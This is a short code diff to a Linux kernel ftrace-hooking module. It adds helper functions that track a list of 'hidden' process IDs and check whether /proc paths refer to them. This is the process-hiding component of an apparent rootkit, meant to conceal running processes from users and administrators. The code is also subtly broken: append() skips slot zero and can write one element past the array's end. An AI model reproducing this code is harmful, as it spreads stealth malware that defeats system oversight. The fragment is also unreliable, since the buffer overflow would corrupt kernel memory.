@@ -183,3 +183,43 @@ void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) {
   for (i = 0; i < count; i++)
     fh_remove_hook(&hooks[i]);
 }
+
+// added utils
+//
+
+static int HIDDEN_POS = 0;
+#define MAX_PIDS 64
+static pid_t hidden_pids[MAX_PIDS];
+static bool append(pid_t pid) {
+  HIDDEN_POS++;
+  if (HIDDEN_POS <= MAX_PIDS) {
+    hidden_pids[HIDDEN_POS] = pid;
+    return true;
+  }
+  HIDDEN_POS--;
+  return false;
+}
+static bool remove_item(pid_t pid) {
+  for (int i = 0; i < MAX_PIDS; i++) {
+    if (hidden_pids[i] == pid) {
+      hidden_pids[i] = 0;
+      HIDDEN_POS--;
+      return true;
+    }
+  }
+  return false;
+}
+
+bool exists(char item[]) {
+
+  for (int i = 0; i < MAX_PIDS; i++) {
+    char str[64];
+    if (hidden_pids[i] != 0) {
+      sprintf(str, "/proc/%d", hidden_pids[i]);
+      if (strstr(item, str)) {
+        return true;
+      }
+    }
+  }
+  return false;
+}
